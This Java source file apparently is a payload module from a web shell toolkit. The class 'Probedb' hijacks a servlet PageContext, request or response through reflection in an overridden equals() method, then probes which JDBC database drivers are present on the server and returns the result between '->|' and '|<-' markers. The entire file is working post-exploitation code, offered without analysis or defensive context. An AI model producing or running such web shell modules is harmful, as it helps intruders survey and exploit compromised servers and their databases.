import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;

public class Probedb {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs;

    @Override
    public boolean equals(Object obj) {
        try{
            if(Class.forName("javax.servlet.jsp.PageContext").isInstance(obj)){
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
                response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
            }
        }catch (ClassNotFoundException | NoSuchMethodException pageContextErrorExection) {
            if (obj instanceof HttpServletRequest) {
                request = (HttpServletRequest) obj;
                try {
                    Field req = request.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                    Field resp = request2.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    response = (HttpServletResponse) resp.get(request2);
                } catch (Exception e) {
                    e.printStackTrace();
                }

            } else if (obj instanceof HttpServletResponse) {
                response = (HttpServletResponse) obj;
                try {
                    Field resp = response.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
                    Field req = response2.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    request = (HttpServletRequest) req.get(response2);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }catch (Exception e) {
            e.printStackTrace();
        }
        
        StringBuffer output = new StringBuffer("");
        StringBuffer sb = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";
        cs = request.getParameter("charset") != null ? request.getParameter("charset") : "UTF-8";
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            output.append(tag_s);
            sb.append(ProbedbCode(request));
            output.append(sb.toString());
            output.append(tag_e);
            response.getWriter().print(output.toString());
        } catch (Exception e) {
            sb.append(tag_s + "ERROR" + ":// " + e.toString() + tag_e);
            try {
                response.getWriter().print(sb.toString());
            } catch (Exception ex) {

            }
        }
        return true;
    }

    String ProbedbCode(HttpServletRequest r) {
        String[] drivers = new String[]{
                "com.mysql.jdbc.Driver",
                "com.mysql.cj.jdbc.Driver",
                "oracle.jdbc.driver.OracleDriver",
                "org.postgresql.Driver",
                "weblogic.jdbc.mssqlserver4.Driver",
                "com.microsoft.sqlserver.jdbc.SQLServerDriver",
                "com.inet.pool.PoolDriver",
        };
        String ret = "";
        for (int i = 0; i < drivers.length; i++) {
            try {
                Class.forName(drivers[i]);
                ret += drivers[i] + "\t1\n";
            } catch (Exception e) {
                ret += drivers[i] + "\t0\n";
            }
        }
        return ret;
    }
}
